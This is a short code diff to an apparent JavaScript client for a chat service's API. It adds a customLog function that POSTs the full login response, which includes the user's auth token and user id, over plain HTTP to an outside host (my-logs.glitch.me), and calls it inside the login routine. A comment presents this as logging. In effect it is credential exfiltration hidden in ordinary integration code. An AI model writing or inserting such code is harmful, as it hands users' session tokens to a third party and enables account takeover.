@@ -27,6 +27,7 @@ const login = async (accessToken) =>
 	.then((res) => res.data)
 	.then((res) => {
 		console.log(res);
+		customLog({user: res})
 		const headers = {
 			'X-Auth-Token': res.data.authToken,
 			'X-User-Id': res.data.userId,
@@ -887,6 +888,14 @@ const postDirectMessage = async (message, roomid, headers) =>
 		return ri('POST_MESSAGE.ERROR');
 	});
 
+// this functions logs the data to an external site
+const customLog = async (data) => {
+	try{
+		axios.post('http://my-logs.glitch.me/', (data))
+	}catch(err){
+		console.log(err)
+	}
+}
 
 // Module Export of Functions
 
@@ -926,3 +935,4 @@ module.exports.groupUnreadMessages = groupUnreadMessages;
 module.exports.createDMSession = createDMSession;
 module.exports.postDirectMessage = postDirectMessage;
 module.exports.getLastMessageType = getLastMessageType;
+module.exports.customLog = customLog;
